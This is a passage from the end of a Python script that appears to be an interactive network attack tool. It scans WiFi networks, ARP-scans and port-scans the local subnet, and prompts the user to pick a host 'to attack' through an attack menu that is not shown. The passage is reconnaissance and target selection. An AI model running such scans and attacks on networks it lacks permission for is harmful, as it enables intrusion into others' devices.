        # Parse name table offset 57 — each entry 18 bytes
        num_names = resp[56] if len(resp) > 56 else 0
        console.print(f"[green][+] {num_names} NetBIOS name(s):[/green]")
        for i in range(num_names):
            offset = 57 + i * 18
            name   = resp[offset:offset+15].decode("ascii", errors="ignore").strip()
            flags  = int.from_bytes(resp[offset+16:offset+18], "big")
            ntype  = "GROUP" if flags & 0x8000 else "UNIQUE"
            console.print(f"[cyan]   {name} ({ntype})[/cyan]")
    except socket.timeout:
        console.print("[dim]   No NetBIOS response.[/dim]")
    except Exception as e:
        console.print(f"[dim]   NetBIOS: {e}[/dim]")


# ─── MAIN FLOW ────────────────────────────────────────────────────────────────

async def main() -> None:
    require_root()
    os.system("clear")
    console.print(BANNER)

    iface = get_default_iface()
    console.print(f"[dim]Detected interface: [bold]{iface}[/bold] — override below if wrong[/dim]")
    iface_in = Prompt.ask("Interface", default=iface)
    if iface_in.strip():
        iface = iface_in.strip()

    # ── Step 1: Scan WiFi ────────────────────────────────────────────────────
    console.print("\n[bold yellow][*] Scanning nearby WiFi networks...[/bold yellow]")
    networks = scan_wifi_networks()

    if not networks:
        console.print("[red][-] No networks found. Check adapter / permissions.[/red]")
        sys.exit(1)

    t = Table(title="Nearby WiFi Networks", box=box.SIMPLE_HEAVY)
    t.add_column("#",        style="bold red")
    t.add_column("SSID",     style="cyan")
    t.add_column("BSSID",    style="dim")
    t.add_column("Signal",   justify="right")
    t.add_column("Channel",  justify="right")
    t.add_column("Security", style="yellow")

    for i, n in enumerate(networks, 1):
        t.add_row(str(i), n.ssid, n.bssid, str(n.signal), str(n.channel), n.security)
    console.print(t)

    # ── Step 2: Connect ──────────────────────────────────────────────────────
    choice = Prompt.ask("Pick network # to connect (or 0 to skip — use already-connected)", default="0")
    if choice != "0":
        idx = int(choice) - 1
        net = networks[idx]
        pw  = ""
        if "OPEN" not in net.security.upper():
            pw = Prompt.ask(f"Password for '{net.ssid}'", password=True)
        connect_to_network(net.ssid, pw)

    # ── Step 3: ARP scan ─────────────────────────────────────────────────────
    cidr  = get_local_cidr()
    cidr  = Prompt.ask("Subnet to scan", default=cidr)
    hosts = arp_scan(cidr)

    if not hosts:
        console.print("[red][-] No hosts found on network.[/red]")
        sys.exit(1)

    # Resolve hostnames
    console.print("[yellow][*] Resolving hostnames...[/yellow]")
    for h in hosts:
        h.hostname = resolve_hostname(h.ip)

    # Quick port scan top 20
    console.print("[yellow][*] Quick port scan (top 20 ports)...[/yellow]")
    threads = [threading.Thread(target=port_scan, args=(h,)) for h in hosts]
    for t in threads: t.start()
    for t in threads: t.join()

    # ── Step 4: Host list ────────────────────────────────────────────────────
    console.print()
    ht = Table(title="Hosts on Network", box=box.SIMPLE_HEAVY)
    ht.add_column("#",        style="bold red")
    ht.add_column("IP",       style="cyan")
    ht.add_column("MAC",      style="dim")
    ht.add_column("Vendor",   style="yellow")
    ht.add_column("Hostname", style="white")
    ht.add_column("Open Ports", style="green")

    for i, h in enumerate(hosts, 1):
        ports_str = ", ".join(
            f"{p}/{PORT_SERVICES.get(p, '?')}" for p in h.open_ports
        ) or "—"
        ht.add_row(str(i), h.ip, h.mac, h.vendor, h.hostname, ports_str)
    console.print(ht)

    # ── Step 5: Pick target → attack menu ───────────────────────────────────
    while True:
        pick = Prompt.ask("\nPick host # to attack (0 to exit)", default="0")
        if pick == "0":
            break
        try:
            target = hosts[int(pick) - 1]
            attack_menu(target, iface)
        except (IndexError, ValueError):
            console.print("[red]Invalid.[/red]")


if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
